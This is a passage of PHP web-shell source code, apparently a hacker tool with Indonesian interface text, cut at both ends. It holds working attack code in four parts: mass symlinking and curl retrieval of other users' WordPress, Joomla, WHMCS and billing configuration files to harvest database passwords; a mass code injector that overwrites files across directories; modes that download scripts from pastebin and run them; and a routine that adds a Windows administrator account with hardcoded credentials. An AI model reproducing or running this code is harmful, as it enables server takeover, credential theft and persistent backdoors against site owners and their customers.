@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/alx_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-

Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-

BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) 

Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"alx_symconf/root/\">Root Server</a>
<br><a href=\"alx_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"alx_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
	    	  	
	} elseif($_GET['go'] == 'code') {
echo '<center><h1>Mass Code Injector</h1></center>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : 'ALx was Here..!';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was 

injected</span></div>';
                } else {
                    echo '<div><span style="color:#ff0066;">failed to inject</span> <strong>'.$d.$DS.

$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was 

injected</span></div>';
                } else {
                    echo '<div><span style="color:#ff0066;">failed to inject</span> <strong>'.$d.$DS.

$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" 

checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST

['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" 

value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';
    } elseif($_GET['go'] == 'hash') {
 $submit = $_POST['enter'];
   
 if (isset($submit)) {
     
   $pass = $_POST['password']; // password
      
  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 
     $hash = md5($pass); // md5 hash #1
     
   $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
   
     $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
     
   $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
     
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
       
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
     
   
    }
    echo '<center><form action="" method="post"><b> ';
  
  echo '<center><h2><b>=[ Password Hash]=</b></h2></center></tr>';
 
   echo ' <center><b>Masukkan kata yang ingin di Encrypt:</b> ';
  
  echo ' <input class="inputz" type="text" name="password" size="40" />';
 
   echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
  
  echo ' <br>';
    echo ' </th></center></tr>';
 
   echo ' Pass Asli  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>';
 
   echo ' MD5  <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
    
echo ' MD4  <input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';
    
echo ' MD5 with Salt  <input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';
  
  echo ' MD5 with Salt & Sha1  <input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';

    echo ' Sha1  <input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';
 
   echo ' Sha256  <input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';
 
   echo ' Sha1 with Salt  <input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';
 
   echo ' Sha1 with Salt & MD5  <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> 

<br><br>';

} elseif($_GET['go'] == 'hijack')
	{
	$hijack_dir = mkdir('wp_hijack', 0755);
	$file_hijack = "wp_hijack/hijack.php";	
	$isi_hthijack = "#WpHijack \r\nDirectoryIndex index.php\r\nErrorDocument 404 /404.php";
	$hthijack = fopen(".htaccess", "w");
	fwrite($hthijack, $isi_hthijack);
	fclose($hthijack);	
	$hijack_script = getsource("http://pastebin.com/raw/sqJcMGGZ");
	$hijack = fopen($file_hijack, "w");
	fwrite($hijack, $hijack_script);
	fclose($hijack);
	chmod($file_hijack, 0755);
	echo "<iframe src='wp_hijack/hijack.php' width='100%' height='50%' frameborder='0' scrolling='yes'></iframe>";
	
} elseif($_GET['go'] == 'log_hunt') {
	$log_hunt_dir = mkdir('wp_log_hunt', 0755);
	$file_log_hunt = "/log_hunt.php";	
		$isi_htlog_hunt = "#LogHunt \r\nDirectoryIndex index.php\r\nErrorDocument 404 /404.php";
	$htlog_hunt = fopen(".htaccess", "w");
	fwrite($htlog_hunt, $isi_htlog_hunt);
	fclose($htlog_hunt);	
	$log_hunt_script = getsource("http://pastebin.com/raw/5uzVYhhZ");
	$log_hunt = fopen($file_log_hunt, "w");
	fwrite($log_hunt, $log_hunt_script);
	fclose($log_hunt);
	chmod($file_log_hunt, 0755);
	echo "<iframe src='/log_hunt.php' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>";	
	
    } elseif($_GET['go'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=blue>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=blue>".$ip."</font><br>
    			Username: <font color=blue>$user</font><br>
    			Password: <font color=blue>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='blue'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='blue'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='blue'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='blue'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=blue>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=blue>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user alxwahid");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=blue>512536@</font>] -> ";
					if($cek) {
						echo "<font color=blue>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=blue>$user</font>] -> ";
					if($cek) {
						echo "<font color=blue>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='alxwahid' required>
			<input type='text' name='pass' placeholder='password' value='512536@' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
 } elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
	
} elseif($_GET['act'] == 'chmodx_dir') {	
if(isset($_POST['perm'])){
if(chmod_dir($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
		}
